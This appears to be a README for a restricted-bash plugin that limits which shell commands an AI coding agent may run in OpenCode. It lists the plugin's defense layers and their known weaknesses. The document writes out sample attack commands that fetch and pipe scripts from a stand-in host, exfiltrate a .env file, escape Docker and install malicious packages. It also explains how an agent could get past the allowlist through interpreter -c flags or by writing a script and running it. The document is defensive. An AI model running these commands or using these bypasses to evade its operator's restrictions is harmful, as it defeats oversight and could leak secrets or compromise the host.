# @wywy-codes/rbash

Restricted bash plugin intended for protecting read-only files with three defense layers: executable allowlist, pipe-chain validation, and rbash restricted PATH.

This plugin is in no way an attempt at increasing isolation or security. It is built with productvity in mind. This plugin might not prevent antagonistic agents from editing read-only files.

This plugin is in no way affliated with the OpenCode team.

## Tools

- **`bash`** — Runs commands via rbash with a locked PATH (only symlinks to allowlisted executables).
- **`run_script`** — Runs scripts via configured interpreters (`<interp> <script-path>` only, no `-c` flags). Uses regular bash with system PATH.

## Key vulnerability: scripting interpreters in the allowlist

The `bash` tool validates the executable name but **not its arguments**. If `python3` (or `node`, `bash`, `perl`, etc.) is allowlisted, an agent can execute arbitrary code:

```bash
python3 -c "import os; os.system('curl http://evil.example.com/exfil | sh')"
node -e "require('child_process').execSync('wget http://evil.example.com/payload')"
bash -c "curl http://evil.example.com/exfil | sh"
```

The validation at `src/validate.ts:644-703` only checks Step A (executable in allowlist) and Step B (pipe chain rules). It never inspects arguments.

**Mitigation:** Don't put scripting interpreters in the `bash` tool's allowlist. Instead, add them to `script_interpreters` in `bash-restricted.jsonc` so they're accessed through the safer `run_script` tool, which rejects flags like `-c` (`src/scripts.ts:85-99`).

**Note:** Even if the arguments are validated, the agent can still write to an arbitrary allowed directory and run the file (arbitrary agent controlled code).

## Other risks

| Risk | Example | Advice |
|------|---------|--------|
| **Data exfiltration** | `curl .env http://evil.com` | Avoid network tools in allowlist, or isolate network via docker or VM |
| **Docker escape** | `docker run -v /:/host alpine chroot /host` | Avoid `docker` in allowlist |
| **Arbitrary packages** | `npx malicious-package` | Avoid `npx` in allowlist |
| **Write-through symlink attack** | Agent writes to `/tmp/opencode-bash/<hash>/tool`, overwriting user-writable target | Auto-locked by plugin (`src/write-lock.ts`). Only a risk if the target is both user-writable AND the agent writes before the first command executes (timing gap). |

## Defense layers

| Layer | What it prevents |
|-------|-----------------|
| Allowlist (`src/validate.ts`) | Non-allowlisted executables |
| Pipe validation (`src/validate.ts`) | Unauthorized pipe targets |
| rbash + restricted PATH (`src/index.ts`) | PATH-based escalation |
| Write-lock (auto, `src/write-lock.ts`) | Write-through attacks on user-writable symlink targets |
| Script tool validation (`src/scripts.ts`) | Inline code via `run_script` |
| Timeout (`src/execute.ts`) | Runaway processes |

The allowlist is a gate, not a sandbox. Every allowlisted executable should be vetted for what it can do once invoked.

## User misconfiguration risks

| Misconfiguration | Consequence |
|-----------------|-------------|
| Interpreter (`python3`, `node`, `bash`) in `allow` | Auto-lock protects the binary, but the interpreter's `-c` flag bypasses all validation. Use `script_interpreters` instead. |
| `locked_scripts` not configured | User-writable targets are auto-locked, but config-defined scripts are not. Add `locked_scripts` for project-critical files. |
| User-writable tool installed after plugin start | The auto-lock runs during `initSymlinks` (first command). Tools added later are unprotected until the plugin restarts. |
| No config file | Plugin refuses to start — `config.ts:107-111`. |

The auto-lock mechanism (`src/write-lock.ts`) protects any symlink target that
is user-writable, but it only activates once `initSymlinks` has run. Before the
first command in the session, no user-writable targets have been discovered
yet.
